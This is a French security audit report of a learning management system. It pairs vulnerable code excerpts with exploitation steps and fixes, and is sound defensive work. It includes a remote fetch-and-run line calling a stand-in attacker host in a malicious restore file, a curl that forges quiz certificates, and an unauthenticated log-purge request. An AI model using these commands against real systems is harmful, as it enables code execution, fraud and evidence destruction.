# Audit de sécurité — LMS_by_module

**Date de l'audit :** 25 juillet 2026
**Commit audité :** `43f58cd`
**Périmètre :** code applicatif de premier niveau (`src/`, `prisma/`, `scripts/`, `lms-license-cli/`), configuration de déploiement (`Dockerfile`, `docker-compose.yml`, `Caddyfile`, `next.config.ts`), dépendances npm.
**Hors périmètre :** bibliothèques H5P tierces (`h5p-libraries/`, `public/h5p-standalone/`), `node_modules`.
**Référentiel :** OWASP Top 10 2021 + OWASP ASVS 4.0, classification CWE.
**Nature de l'intervention :** lecture seule. **Aucun fichier de code n'a été modifié.**

---

## 1. Synthèse exécutive

L'application est un LMS multi-rôles (superadmin / admin / manager / creator / learner) avec un module DRM (chiffrement de contenu par instance + licence signée), une gestion documentaire à valeur probante (signature de PDF, certificats) et des sauvegardes/restaurations complètes.

La base est saine sur plusieurs points structurants : **aucune requête SQL brute** (Prisma partout, donc pas d'injection SQL), hachage bcrypt à coût 12, politique de mot de passe applicative, journal d'audit dédoublé fichier + base, secrets non versionnés (`.env` correctement ignoré), et un modèle de chiffrement de contenu RSA + AES cohérent dans ses grandes lignes.

En revanche, le modèle d'autorisation est **incohérent d'une route à l'autre** : le même type d'objet (un cours, une vidéo, un quiz) est protégé sérieusement dans certains fichiers et pas du tout dans d'autres. Trois conséquences majeures :

1. **Un endpoint destructif est totalement ouvert** — n'importe qui sur le réseau peut effacer le journal d'audit (`/api/cron/purge-logs`), ce qui détruit la valeur probante de tout le reste.
2. **La logique métier « réussite / certificat » est côté client** — un apprenant peut s'auto-délivrer un certificat sans suivre la formation. Pour un LMS de conformité, c'est la faille la plus coûteuse fonctionnellement.
3. **Le DRM est contournable de l'intérieur** — tout compte authentifié peut faire déchiffrer et servir n'importe quel cours ou vidéo, sans affectation.

À cela s'ajoute une fenêtre de compromission totale du serveur : la restauration de sauvegarde en phase d'installation est non authentifiée et exécute un fichier SQL arbitraire via `psql -f`, ce qui permet l'exécution de commandes shell.

### 1.1 Décompte

| Sévérité | Nombre |
|---|---|
| 🔴 Critique | 5 |
| 🟠 Élevée | 10 |
| 🟡 Moyenne | 13 |
| 🔵 Faible | 5 |
| **Total** | **33** |

### 1.2 Tableau de bord des constats

| ID | Sévérité | Titre | Fichier principal | OWASP 2021 |
|---|---|---|---|---|
| C-01 | 🔴 Critique | Suppression du journal d'audit sans authentification | `src/app/api/cron/purge-logs/route.ts` | A01 / A09 |
| C-02 | 🔴 Critique | Score de quiz et certificats calculés/validés côté client | `src/app/api/courses/[id]/quiz/route.ts` | A04 / A01 |
| C-03 | 🔴 Critique | Restauration de sauvegarde non authentifiée → exécution de commandes | `src/app/api/setup/restore/route.ts` | A01 / A03 |
| C-04 | 🔴 Critique | Upload et modification de vidéos de cours sans aucun contrôle de rôle | `src/app/api/courses/[id]/native-video/route.ts` | A01 |
| C-05 | 🔴 Critique | Identifiants par défaut `admin` / `rootroot` versionnés | `prisma/seed.ts` | A07 |
| H-01 | 🟠 Élevée | Rôles et mode admin jamais revalidés (JWT figé) | `src/lib/auth.ts` | A01 / A07 |
| H-02 | 🟠 Élevée | Accès à tout contenu de cours sans affectation (IDOR + contournement DRM) | `src/app/api/courses/[id]/serve/route.ts` | A01 |
| H-03 | 🟠 Élevée | XSS stocké via paquet H5P servi en même origine sans `sandbox` ni CSP | `src/app/api/courses/[id]/content/[...path]/route.ts` | A03 |
| H-04 | 🟠 Élevée | XSS stocké via upload de logo SVG servi publiquement | `src/app/api/admin/branding/route.ts` | A03 |
| H-05 | 🟠 Élevée | Un `admin` peut réinitialiser le mot de passe du superadmin protégé | `src/app/api/admin/users/[id]/reset-password/route.ts` | A01 |
| H-06 | 🟠 Élevée | Mots de passe générés avec `Math.random()` | `src/lib/password.ts` | A02 |
| H-07 | 🟠 Élevée | Dérivation de clé absente + clé de repli `000…0` pour le DRM | `src/lib/license-verify.ts` | A02 |
| H-08 | 🟠 Élevée | Aucune limitation de tentatives sur l'authentification | `src/lib/auth.ts` | A07 |
| H-09 | 🟠 Élevée | 10 vulnérabilités connues dans les dépendances (2 critiques) | `package.json` | A06 |
| H-10 | 🟠 Élevée | Journaux d'audit contenant des données personnelles versionnés dans Git | `logs/audit/*.log` | A01 / A09 |
| M-01 | 🟡 Moyenne | Aucun en-tête de sécurité (CSP, HSTS, X-Frame-Options…) | `next.config.ts`, `Caddyfile` | A05 |
| M-02 | 🟡 Moyenne | Anti-traversée de chemin par `replace('..','')` au lieu d'une vérification de confinement | `src/app/api/assets/[...path]/route.ts` | A01 |
| M-03 | 🟡 Moyenne | Extraction d'archives sans limite (zip bomb) et écrasement de `uploads/` | `src/lib/h5p.ts`, `src/lib/backup.ts` | A05 |
| M-04 | 🟡 Moyenne | Interpolation shell dans `execSync` pour `pg_dump`/`psql` | `src/lib/backup.ts` | A03 |
| M-05 | 🟡 Moyenne | Quiz de n'importe quel cours modifiable par tout manager/creator | `src/app/api/admin/courses/[id]/questions/route.ts` | A01 |
| M-06 | 🟡 Moyenne | Échéances d'affectation modifiables sur tout cours (`PATCH` sans contrôle) | `src/app/api/courses/[id]/assign/route.ts` | A01 |
| M-07 | 🟡 Moyenne | Annuaire complet des utilisateurs exposé aux managers/creators | `src/app/api/admin/users/route.ts` | A01 |
| M-08 | 🟡 Moyenne | Injection de formules dans les exports CSV | `src/app/api/export/progress/route.ts` | A03 |
| M-09 | 🟡 Moyenne | `postMessage` accepté sans vérification d'origine | `src/app/dashboard/courses/[id]/play/play-page-client.tsx` | A04 |
| M-10 | 🟡 Moyenne | Secrets SMTP / Graph / cron stockés en clair en base | `prisma/schema.prisma` | A02 |
| M-11 | 🟡 Moyenne | Sauvegardes non chiffrées contenant tous les secrets | `src/lib/backup.ts` | A02 |
| M-12 | 🟡 Moyenne | Application exposée en clair hors du reverse proxy TLS | `docker-compose.yml` | A05 |
| M-13 | 🟡 Moyenne | Server Actions accessibles sans authentification | `src/actions/license-cookie.ts`, `src/lib/actions/session.ts` | A01 |
| L-01 | 🔵 Faible | Messages d'erreur internes renvoyés au client (`String(err)`) | plusieurs routes | A05 |
| L-02 | 🔵 Faible | Vignettes de cours servies sans contrôle en route | `src/app/api/courses/[id]/thumbnail/route.ts` | A01 |
| L-03 | 🔵 Faible | `trustHost: true` sans `AUTH_URL` défini | `src/lib/auth.ts` | A05 |
| L-04 | 🔵 Faible | IV GCM de 16 octets et conversion UTF-8 fragile de la clé | `src/lib/instance-crypto.ts` | A02 |
| L-05 | 🔵 Faible | Échecs d'écriture du journal d'audit silencieux | `src/lib/audit.ts` | A09 |

---

## 2. Constats critiques

### C-01 🔴 Suppression du journal d'audit sans authentification

**Fichiers :** `src/app/api/cron/purge-logs/route.ts:4-20` — `src/middleware.ts:14`
**CWE :** CWE-306 (fonction critique sans authentification), CWE-778 (journalisation insuffisante)
**OWASP :** A01 Broken Access Control / A09 Security Logging Failures

**La faille.** Les deux autres routes cron vérifient un secret partagé :

```ts
// src/app/api/cron/backup/route.ts:8-12
const mailCfg = await getMailConfig();
const secret = mailCfg.cronSecret;
const authHeader = req.headers.get("authorization");
if (!secret || authHeader !== `Bearer ${secret}`)
  return NextResponse.json({ error: "Non autorisé" }, { status: 401 });
```

`purge-logs` ne le fait pas du tout :

```ts
// src/app/api/cron/purge-logs/route.ts:4-20
export async function GET() {                       // ← aucune vérification
  const setting = await prisma.brandingSetting.findFirst({ … });
  const days = setting?.auditLogRetentionDays ?? 180;
  if (days === 0) { … }
  const cutoff = new Date(Date.now() - days * 24 * 60 * 60 * 1000);
  const { count } = await prisma.auditLog.deleteMany({
    where: { createdAt: { lt: cutoff } },           // ← suppression en base
  });
```

Et le middleware place explicitement tout `/api/cron/` en zone publique, donc aucune session n'est requise en amont :

```ts
// src/middleware.ts:9-21
if (
  pathname.startsWith("/login") ||
  …
  pathname.startsWith("/api/cron/") ||             // ← whitelist
  pathname.startsWith("/api/public/")
) { … return NextResponse.next(); }
```

**Exploitation.** `curl http://lms.interne/api/cron/purge-logs` — sans cookie, sans en-tête. Comme c'est un `GET`, la requête est aussi déclenchable par simple visite d'une page piégée (`<img src="…/api/cron/purge-logs">`), donc sans même accès réseau direct.

**Impact.** Destruction des preuves d'audit au-delà de la rétention configurée. Un attaquant peut réduire la rétention à 1 jour via un autre vecteur (ou attendre) puis purger. Pour une application qui sert à prouver la conformité d'un plan de formation, c'est l'atteinte la plus grave à l'intégrité du dispositif.

**Correction.**

```ts
// src/app/api/cron/purge-logs/route.ts
import { NextRequest, NextResponse } from "next/server";
import { timingSafeEqual } from "crypto";
import { getMailConfig } from "@/lib/mail-config";
import { prisma } from "@/lib/prisma";
import { auditLog } from "@/lib/audit";

function checkCronSecret(req: NextRequest, secret: string | null): boolean {
  if (!secret) return false;
  const header = req.headers.get("authorization") ?? "";
  const expected = Buffer.from(`Bearer ${secret}`);
  const given = Buffer.from(header);
  return given.length === expected.length && timingSafeEqual(given, expected);
}

export async function POST(req: NextRequest) {           // POST, plus GET
  const { cronSecret } = await getMailConfig();
  if (!checkCronSecret(req, cronSecret))
    return NextResponse.json({ error: "Non autorisé" }, { status: 401 });

  const setting = await prisma.brandingSetting.findFirst({
    select: { auditLogRetentionDays: true },
  });
  const days = setting?.auditLogRetentionDays ?? 180;
  if (days === 0)
    return NextResponse.json({ ok: true, purged: 0, message: "Rétention illimitée." });

  const cutoff = new Date(Date.now() - days * 86_400_000);
  const { count } = await prisma.auditLog.deleteMany({ where: { createdAt: { lt: cutoff } } });

  // La purge est elle-même un événement auditable
  await auditLog({ actor: { email: "system:cron" }, action: "audit.purge",
                   details: { purged: count, cutoff: cutoff.toISOString(), days } });

  return NextResponse.json({ ok: true, purged: count, cutoff: cutoff.toISOString() });
}
```

Compléments recommandés :
- appliquer `checkCronSecret` (comparaison à temps constant) aux trois routes cron, au lieu de la comparaison `!==` actuelle ;
- refuser tout verbe destructif en `GET` sur l'ensemble de l'API ;
- restreindre `/api/cron/*` aux IP internes côté Caddy (`@cron remote_ip 127.0.0.1 10.0.0.0/8`) en défense en profondeur ;
- pour une valeur probante réelle : chaînage par HMAC des lignes du journal fichier (chaque ligne signe la précédente) afin qu'une suppression devienne détectable.

---

### C-02 🔴 Score de quiz et certificats calculés et validés côté client

**Fichiers :**
- `src/app/api/courses/[id]/quiz/route.ts:13, 22-32, 37-62`
- `src/app/api/admin/courses/[id]/questions/route.ts:7-17`
- `src/components/courses/quiz-player.tsx:41, 53, 91-98`
- `src/app/api/courses/[id]/progress/route.ts:64, 78-91`

**CWE :** CWE-602 (contrôle côté client contourné côté serveur), CWE-639 (contournement d'autorisation par clé), CWE-807 (décision sur entrée non fiable)
**OWASP :** A04 Insecure Design / A01 Broken Access Control

**La faille — trois maillons qui s'enchaînent.**

*(a) Le serveur livre les bonnes réponses à tout compte authentifié.* La route est sous `/api/admin/`, mais son `GET` ne vérifie que la présence d'une session — pas le rôle :

```ts
// src/app/api/admin/courses/[id]/questions/route.ts:7-17
export async function GET(_req: NextRequest, { params }: Params) {
  const session = await auth();
  if (!session) return NextResponse.json({ error: "Non autorisé" }, { status: 401 });
  const { id } = await params;
  const questions = await prisma.quizQuestion.findMany({
    where: { courseId: id }, orderBy: { order: "asc" },
  });
  return NextResponse.json(questions);   // ← contient correctAnswer + explanation
}
```

Et c'est bien cette route que le lecteur d'apprenant appelle : `src/components/courses/quiz-player.tsx:53`.

*(b) La correction se fait dans le navigateur.*

```ts
// src/components/courses/quiz-player.tsx:41 et 91-98
return normalize(question.correctAnswer) === normalize(answer);
…
const quizCorrect = questions.filter((q) => isCorrect(q, answers[q.id] ?? "")).length;
const res = await fetch(`/api/courses/${courseId}/quiz`, { method: "POST", … });
```

*(c) Le serveur enregistre le résultat transmis sans le recalculer.*

```ts
// src/app/api/courses/[id]/quiz/route.ts:13, 22-32
const { answers, score, passed } = await req.json();   // ← 100 % piloté par le client
…
const result = await prisma.userQuizResult.create({
  data: { userId: session.user.id, courseId: id, attempt, score, passingScore, passed,
          answersData: answers },
});
if (passed) { … prisma.certificate.create({ … quizScore: score, quizPassed: true … }) }
```

**Exploitation.** Une seule requête suffit, sans même ouvrir le cours :

```bash
curl -X POST https://lms/api/courses/<courseId>/quiz \
  -H 'Content-Type: application/json' -b 'authjs.session-token=<cookie apprenant>' \
  -d '{"answers":{},"score":100,"passed":true}'
```

Le certificat est créé, avec `completedAt` issu de la progression (ou l'instant courant). Même chose côté progression : `POST /api/courses/[id]/progress` accepte un `h5pScore` arbitraire (`route.ts:64`) qui pilote `completedAt`, `progress: 100` et la création du certificat pour les cours sans quiz.

**Impact.** Tout apprenant peut se délivrer les certificats de n'importe quel cours (y compris non affecté, l'`id` du cours n'étant pas contrôlé), sans avoir consulté le contenu. Les tableaux de bord de conformité, exports RH et attestations deviennent non fiables — et rien dans le journal ne distingue une réussite réelle d'une réussite forgée.

**Correction.** Ne jamais transmettre `correctAnswer` à un apprenant, et corriger côté serveur.

```ts
// 1) src/app/api/admin/courses/[id]/questions/route.ts — GET : réserver aux rôles d'édition
export async function GET(_req: NextRequest, { params }: Params) {
  const session = await auth();
  if (!await canEditQuestions(session?.user?.id, session?.user?.sessionMode === "admin"))
    return NextResponse.json({ error: "Non autorisé" }, { status: 403 });
  …
}

// 2) Nouvelle route de passage d'examen, sans les réponses
// src/app/api/courses/[id]/quiz/questions/route.ts
export async function GET(_req: NextRequest, { params }: Params) {
  const session = await auth();
  if (!session?.user?.id) return NextResponse.json({ error: "Non autorisé" }, { status: 401 });
  const { id } = await params;

  // Le contenu n'est visible que si le cours est affecté
  const assigned = await prisma.courseAssignment.findUnique({
    where: { userId_courseId: { userId: session.user.id, courseId: id } },
  });
  if (!assigned) return NextResponse.json({ error: "Non affecté" }, { status: 403 });

  const questions = await prisma.quizQuestion.findMany({
    where: { courseId: id }, orderBy: { order: "asc" },
    select: { id: true, type: true, question: true, allowMultiple: true,
              choiceA: true, choiceB: true, choiceC: true, choiceD: true, choiceE: true,
              choiceF: true, choiceG: true, choiceH: true, choiceI: true, choiceJ: true },
              // ni correctAnswer ni explanation
  });
  return NextResponse.json(questions);
}

// 3) src/app/api/courses/[id]/quiz/route.ts — correction serveur
export async function POST(req: NextRequest, { params }: Params) {
  const session = await auth();
  if (!session?.user?.id) return NextResponse.json({ error: "Non autorisé" }, { status: 401 });

  const { id } = await params;
  const { answers } = await req.json() as { answers: Record<string, string> };
  if (!answers || typeof answers !== "object")
    return NextResponse.json({ error: "answers requis" }, { status: 400 });

  const [course, assignment, questions] = await Promise.all([
    prisma.course.findUnique({ where: { id } }),
    prisma.courseAssignment.findUnique({
      where: { userId_courseId: { userId: session.user.id, courseId: id } } }),
    prisma.quizQuestion.findMany({ where: { courseId: id } }),
  ]);
  if (!course) return NextResponse.json({ error: "Cours introuvable" }, { status: 404 });
  if (!assignment) return NextResponse.json({ error: "Non affecté" }, { status: 403 });
  if (questions.length === 0)
    return NextResponse.json({ error: "Aucune question" }, { status: 400 });

  // Le cours doit avoir été parcouru avant l'examen
  const progress = await prisma.userCourseProgress.findUnique({
    where: { userId_courseId: { userId: session.user.id, courseId: id } },
    select: { completedAt: true },
  });
  if (!progress?.completedAt)
    return NextResponse.json({ error: "Terminez le cours avant le quiz" }, { status: 409 });

  const correct = questions.filter((q) => isCorrect(q, answers[q.id] ?? "")).length;
  const score = Math.round((correct / questions.length) * 100);   // ← calculé ici
  const passingScore = course.passingScore ?? 80;
  const passed = score >= passingScore;                            // ← décidé ici
  …
}
```

Compléments :
- déplacer la fonction `isCorrect` de `quiz-player.tsx` vers un module serveur partagé (`src/lib/quiz-grading.ts`) et l'appeler uniquement depuis l'API ;
- appliquer la même règle aux questions de vidéo native (`NativeVideoQuestion.choices` contient `correct: boolean`, transmis au client via `GET /api/courses/[id]/native-video`) ;
- pour `POST /api/courses/[id]/progress`, ignorer `h5pScore` du client et n'accepter que des événements de progression bornés (index de diapositive ≤ total réel lu depuis `content.json`), ou signer les événements ;
- limiter le nombre de tentatives (`attempt`) par fenêtre de temps ;
- auditer explicitement `quiz.submit` avec le score recalculé côté serveur (déjà présent ligne 74, mais il journalise aujourd'hui le score fourni par le client).

---

### C-03 🔴 Restauration de sauvegarde non authentifiée menant à l'exécution de commandes

**Fichiers :** `src/app/api/setup/restore/route.ts:14-30` — `src/lib/backup.ts:87-123` (surtout `108-111` et `116-118`)
**CWE :** CWE-306, CWE-78 (injection de commande OS), CWE-434 (upload de fichier dangereux)
**OWASP :** A01 Broken Access Control / A03 Injection

**La faille.** La route d'installation n'a pour seule garde que « aucun compte admin n'existe » :

```ts
// src/app/api/setup/restore/route.ts:8-30
async function adminExists() {
  const role = await prisma.role.findFirst({
    where: { name: { in: ["superadmin", "admin"] } }, include: { users: { take: 1 } } });
  return role && role.users.length > 0;
}

export async function POST(req: NextRequest) {
  if (await adminExists())
    return NextResponse.json({ error: "Setup déjà effectué." }, { status: 403 });
  …
  const file = formData.get("file") as File | null;
  if (!file.name.endsWith(".zip")) …          // seule validation : le nom de fichier
  fs.writeFileSync(tmpZipPath, buffer);
  await restoreBackup(tmpZipPath);            // ← ZIP arbitraire, non authentifié
```

Et `restoreBackup` exécute le `db.sql` de l'archive avec le client `psql` :

```ts
// src/lib/backup.ts:104-118
const sqlPath = path.join(tmpDir, "db.sql");
…
execSync(
  `/usr/bin/psql -h ${db.host} -p ${db.port} -U ${db.user} -d ${db.dbname} -f "${sqlPath}"`,
  { env, stdio: "pipe", timeout: 300_000 }
);
const backupUploads = path.join(tmpDir, "uploads");
if (fs.existsSync(backupUploads)) {
  fs.rmSync(UPLOAD_DIR, { recursive: true, force: true });   // ← efface tous les uploads
  …
}
```

`psql -f` interprète les **méta-commandes backslash**, dont `\!` qui lance un shell. Un `db.sql` contenant `\! curl attacker.tld/x.sh | sh` s'exécute donc avec les droits du processus Node.

**Exploitation.** Deux fenêtres réalistes :
1. **Pendant l'installation** — entre le premier démarrage et la création du compte superadmin, l'endpoint est ouvert à quiconque atteint le port. En déploiement Docker, `docker-compose.yml` publie `4000:3000` en clair : la fenêtre est exposée dès le `docker compose up`.
2. **Après un incident** — si les lignes `Role`/`UserRole` sont perdues (restauration partielle, purge, migration `prisma db push` sur base vide), `adminExists()` redevient `false` et la route se réouvre sur une instance en production.

La même primitive existe côté admin (`src/app/api/admin/restore/route.ts:35`), où elle transforme un compte `admin` compromis en exécution de code sur le serveur.

**Impact.** Exécution de commandes arbitraires sur le conteneur applicatif, réécriture complète de la base (donc création d'un superadmin attaquant), destruction de `uploads/`. Compromission totale de la confidentialité, de l'intégrité et de la disponibilité — y compris des clés DRM stockées en base.

**Correction.**

```ts
// src/lib/backup.ts — remplacer psql -f par une restauration non interprétée
import { execFile } from "child_process";
import { promisify } from "util";
const execFileAsync = promisify(execFile);

export async function restoreBackup(zipPath: string): Promise<void> {
  …
  // 1) Valider le manifeste ET son intégrité avant toute exécution
  const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf8"));
  if (manifest.version !== "1") throw new Error("Version de sauvegarde non supportée");
  const expected = manifest.sqlSha256;                    // à écrire dans createBackup()
  const actual = createHash("sha256").update(fs.readFileSync(sqlPath)).digest("hex");
  if (!expected || expected !== actual) throw new Error("Sauvegarde altérée (hash SQL)");

  // 2) Exécuter SANS méta-commandes backslash et sans shell
  await execFileAsync("/usr/bin/psql", [
    "--no-psqlrc",
    "-v", "ON_ERROR_STOP=1",
    "-h", db.host, "-p", db.port, "-U", db.user, "-d", db.dbname,
    "-c", "\\set QUIET on",        // pas de -f : voir note ci-dessous
  ], { env, timeout: 300_000 });
}
```

Le point essentiel : **ne pas passer un fichier SQL arbitraire à `psql`**. Deux options robustes :
- **Recommandée** : produire les sauvegardes au format personnalisé (`pg_dump -Fc`) et restaurer avec `pg_restore`, qui ne connaît pas les méta-commandes backslash — la primitive `\!` disparaît ;
- sinon, filtrer le SQL avant exécution (rejeter toute ligne commençant par `\`) et signer l'archive (HMAC avec un secret serveur) pour n'accepter que des sauvegardes produites par l'instance.

Sur l'endpoint d'installation :

```ts
// src/app/api/setup/restore/route.ts
// 1) Exiger un jeton d'installation à usage unique, généré au premier démarrage
//    et affiché uniquement dans les logs serveur / un fichier local.
const setupToken = req.headers.get("x-setup-token");
if (!process.env.SETUP_TOKEN || setupToken !== process.env.SETUP_TOKEN)
  return NextResponse.json({ error: "Jeton d'installation invalide" }, { status: 401 });

// 2) Verrouiller définitivement l'installation par un drapeau persistant en base,
//    et non par la présence déductible d'un compte admin.
const cfg = await prisma.instanceConfig.findFirst({ select: { setupCompletedAt: true } });
if (cfg?.setupCompletedAt)
  return NextResponse.json({ error: "Installation déjà finalisée." }, { status: 403 });
```

Compléments : valider la signature du ZIP, plafonner la taille décompressée (voir M-03), et faire tourner l'application sous un utilisateur sans droit d'écriture sur son propre code.

---

### C-04 🔴 Upload et modification de vidéos de cours sans aucun contrôle de rôle

**Fichier :** `src/app/api/courses/[id]/native-video/route.ts:85-95` (POST), `195-205` (PUT)
**CWE :** CWE-862 (autorisation manquante), CWE-434
**OWASP :** A01 Broken Access Control

**La faille.** Les routes voisines vérifient un rôle d'édition (`src/app/api/admin/courses/upload/route.ts:71-77` par exemple). Celle-ci s'arrête à la session :

```ts
// src/app/api/courses/[id]/native-video/route.ts:85-95 — POST
export async function POST(req: NextRequest, { params }: Params) {
  const session = await auth();
  if (!session?.user?.id) return NextResponse.json({ error: "Non autorisé" }, { status: 401 });

  const { id } = await params;
  const course = await prisma.course.findUnique({ where: { id } });
  if (!course) return NextResponse.json({ error: "Cours introuvable" }, { status: 404 });
  // ← aucune vérification de rôle ni de propriété du cours
  const { fields, file } = await parseVideoUpload(req);   // jusqu'à 600 Mo écrits sur disque
```

```ts
// même fichier:195-205 — PUT
export async function PUT(req: NextRequest, { params }: Params) {
  const session = await auth();
  if (!session?.user?.id) return NextResponse.json({ error: "Non autorisé" }, { status: 401 });
  …
  await prisma.nativeVideoQuestion.deleteMany({ where: { videoId: nativeVideo.id } });
  // ← n'importe quel apprenant réécrit les questions du cours
```

**Exploitation.** Un apprenant authentifié remplace la vidéo de n'importe quel cours (`POST` multipart sur `/api/courses/<id>/native-video`) et supprime/réécrit ses questions (`PUT`). Il peut aussi saturer le stockage : 600 Mo par requête, sans quota ni contrôle de rôle.

**Impact.** Altération du contenu de formation (défiguration, contenu illicite diffusé sous la marque de l'organisation), suppression du dispositif d'évaluation, épuisement du disque du serveur.

**Correction.** Factoriser le contrôle existant dans un utilitaire et l'appliquer partout.

```ts
// src/lib/authz.ts (nouveau)
import { prisma } from "@/lib/prisma";

export async function canEditCourse(
  userId: string | undefined, sessionMode: string | null | undefined, courseId: string,
): Promise<boolean> {
  if (!userId) return false;
  if (sessionMode === "admin") return true;

  const [course, roles] = await Promise.all([
    prisma.course.findUnique({ where: { id: courseId }, select: { createdById: true } }),
    prisma.userRole.findMany({ where: { userId }, include: { role: true } }),
  ]);
  if (!course) return false;
  const names = roles.map((r) => r.role.name);
  if (course.createdById === userId && (names.includes("creator") || names.includes("manager")))
    return true;
  if (names.includes("manager") && course.createdById) {
    const inTeam = await prisma.userTeam.findFirst({
      where: { userId: course.createdById, team: { managerId: userId } } });
    return !!inTeam;
  }
  return false;
}
```

```ts
// src/app/api/courses/[id]/native-video/route.ts — POST et PUT
const { id } = await params;
if (!await canEditCourse(session?.user?.id, session?.user?.sessionMode, id))
  return NextResponse.json({ error: "Non autorisé" }, { status: 403 });
```

Le `GET` de la même route doit par ailleurs être réservé aux utilisateurs affectés et **ne pas renvoyer `choices[].correct`** aux apprenants (même problème que C-02).

---

### C-05 🔴 Identifiants par défaut `admin` / `rootroot` versionnés

**Fichier :** `prisma/seed.ts:17-42`
**CWE :** CWE-798 (identifiants codés en dur), CWE-1392 (identifiants par défaut)
**OWASP :** A07 Identification and Authentication Failures

**La faille.**

```ts
// prisma/seed.ts:17-32
const passwordHash = await bcrypt.hash("rootroot", 12);
const admin = await prisma.user.upsert({
  where: { email: "admin" },
  update: {},
  create: { email: "admin", name: "Administrateur", passwordHash, … },
});
…
console.log("Seed terminé — admin / rootroot");
```

Ce compte reçoit le rôle `admin` (lignes 34-42) et **n'est pas** marqué `isProtected`. Le mot de passe est en clair dans le dépôt Git, donc dans l'historique et sur GitHub. Il ne respecte même pas la politique appliquée aux utilisateurs (`src/lib/password.ts` : majuscule, chiffre, caractère spécial).

**Exploitation.** `admin` / `rootroot` sur toute instance où `npm run db:seed` a été lancé — ce qui est le chemin documenté d'initialisation. L'identifiant `admin` n'étant pas un email, il ne collisionne pas avec les comptes réels et passe facilement inaperçu dans la liste des utilisateurs.

**Impact.** Prise de contrôle administrateur complète : lecture de tous les contenus déchiffrés, exports de données personnelles, restauration de sauvegarde (donc C-03 → exécution de code).

**Correction.**

```ts
// prisma/seed.ts — ne créer aucun compte ; ne semer que les données de référence
async function main() {
  for (const name of [RoleType.admin, RoleType.manager, RoleType.creator, RoleType.learner]) {
    await prisma.role.upsert({ where: { name }, update: {}, create: { name } });
  }
  const existingBranding = await prisma.brandingSetting.findFirst();
  if (!existingBranding) await prisma.brandingSetting.create({ data: { appName: "LMS" } });

  console.log("Seed terminé — créez le compte superadmin via /setup");
}
```

Le premier compte doit passer exclusivement par `/api/setup` (`src/app/api/setup/route.ts`), qui applique déjà `validatePassword` et positionne `isProtected: true`. En complément :
- ajouter au démarrage un contrôle qui refuse de servir si un compte porte encore le mot de passe `rootroot` (ou forcer un changement à la première connexion) ;
- **rotation immédiate** : vérifier en base si l'utilisateur `admin` existe encore sur les instances déjà déployées, le désactiver ou le supprimer, et purger le secret de l'historique Git n'a pas d'intérêt ici (le mot de passe est un défaut, pas un secret : il faut le changer partout).

---

## 3. Constats de sévérité élevée

### H-01 🟠 Rôles et mode admin jamais revalidés (JWT figé)

**Fichier :** `src/lib/auth.ts:11, 63-88` — consommé par ~40 routes via `session.user.sessionMode`
**CWE :** CWE-613 (expiration de session insuffisante), CWE-863 (autorisation incorrecte)
**OWASP :** A01 / A07

**La faille.** La session est un JWT (`session: { strategy: "jwt" }`, ligne 11). Les rôles et le mode sont écrits dans le jeton à la connexion et jamais confrontés à la base ensuite :

```ts
// src/lib/auth.ts:70-76
if (user) {
  token.id = user.id;
  token.roles = (user as { roles?: RoleType[] }).roles ?? [];
  token.sessionMode = "user";
  …
}
```

```ts
// src/lib/auth.ts:79-88
async session({ session, token }) {
  session.user.roles = token.roles as RoleType[];
  session.user.sessionMode = (token.sessionMode as "admin" | "user" | null) ?? null;
  …
}
```

Or l'immense majorité des routes d'administration fait confiance à ce seul champ, par exemple :

```ts
// src/app/api/admin/users/route.ts:43-45
const session = await auth();
if (session?.user.sessionMode !== "admin")
  return NextResponse.json({ error: "Non autorisé" }, { status: 403 });
```

L'élévation vers `sessionMode: "admin"` est correctement gardée à l'entrée (`src/app/api/auth/session-mode/route.ts:16-38` : rôle vérifié + mot de passe reconfirmé). Le problème est la **persistance** : une fois le drapeau posé dans le jeton, plus rien ne le remet en cause.

**Exploitation.** Trois scénarios :
1. Un compte est désactivé (`isActive: false`) ou supprimé de ses rôles : son jeton continue d'ouvrir toutes les routes admin jusqu'à expiration (30 jours par défaut chez Auth.js). La désactivation d'un administrateur qui part de l'entreprise n'a donc pas d'effet immédiat.
2. Un jeton volé (XSS — cf. H-03/H-04, ou poste compromis) reste utilisable en mode admin sans redemander le mot de passe.
3. `SessionGuard` (`src/components/layout/session-guard.tsx:15-25`) n'aide pas : il ne compare que l'`id` renvoyé par `/api/auth/me`, lequel ne consulte pas la base (`src/app/api/auth/me/route.ts:4-8`).

**Correction.** Revalider en base, avec un cache court, et faire du mode admin un état à durée de vie limitée.

```ts
// src/lib/auth.ts
callbacks: {
  async jwt({ token, user, trigger, session }) {
    if (user) {
      token.id = user.id;
      token.roles = (user as { roles?: RoleType[] }).roles ?? [];
      token.sessionMode = "user";
      token.rolesCheckedAt = Date.now();
      …
    }
    if (trigger === "update") { … }

    // Revalidation périodique (60 s) contre la base
    const STALE_MS = 60_000;
    if (token.id && Date.now() - Number(token.rolesCheckedAt ?? 0) > STALE_MS) {
      const dbUser = await prisma.user.findUnique({
        where: { id: token.id as string },
        select: { isActive: true, roles: { include: { role: true } } },
      });
      if (!dbUser || !dbUser.isActive) return null;      // session invalidée
      token.roles = dbUser.roles.map((ur) => ur.role.name);
      token.rolesCheckedAt = Date.now();

      const canAdmin = token.roles.includes("admin") || token.roles.includes("superadmin");
      if (token.sessionMode === "admin" && !canAdmin) token.sessionMode = "user";
    }

    // Le mode admin expire au bout de 30 min et doit être reconfirmé par mot de passe
    if (token.sessionMode === "admin" &&
        Date.now() - Number(token.adminModeSince ?? 0) > 30 * 60_000) {
      token.sessionMode = "user";
    }
    return token;
  },
}
```

Et, indépendamment du jeton, faire dépendre les routes sensibles d'une vérification serveur :

```ts
// src/lib/authz.ts
export async function requireAdmin(session: Session | null) {
  if (!session?.user?.id || session.user.sessionMode !== "admin") return false;
  const role = await prisma.userRole.findFirst({
    where: { userId: session.user.id, role: { name: { in: ["admin", "superadmin"] } },
             user: { isActive: true } },
  });
  return !!role;   // le drapeau du jeton ne suffit jamais seul
}
```

Ajouter aussi : `session: { strategy: "jwt", maxAge: 8 * 3600 }`, et une invalidation explicite (colonne `sessionsInvalidBefore` sur `User`, comparée dans le callback `jwt`) déclenchée par la désactivation, le changement de mot de passe et la modification de rôles.

---

### H-02 🟠 Accès à tout contenu de cours sans affectation (IDOR + contournement du DRM)

**Fichiers :**
- `src/app/api/courses/[id]/serve/route.ts:14-40`
- `src/app/api/courses/[id]/content/[...path]/route.ts:13-26`
- `src/app/api/native-video/[id]/stream/route.ts:14-31`
- `src/app/api/courses/[id]/quiz/route.ts:15` et `src/app/api/admin/courses/[id]/route.ts:49-56`
